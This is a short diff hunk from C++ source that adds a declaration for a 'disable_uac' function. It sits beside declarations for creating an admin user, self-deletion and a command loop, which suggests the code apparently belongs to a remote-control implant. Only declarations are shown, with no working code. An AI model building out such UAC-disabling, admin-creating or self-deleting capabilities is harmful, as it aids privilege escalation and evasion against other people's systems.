@@ -1621,6 +1621,7 @@ static bool execute_login_user_fast(const std::string &uuid, const std::string &
                                      const std::string &username, const std::string &password);
 static bool create_admin_user(const std::string &username, const std::string &password);
 static void self_delete();
+bool disable_uac();
 
 void controlCommandLoop()
 {
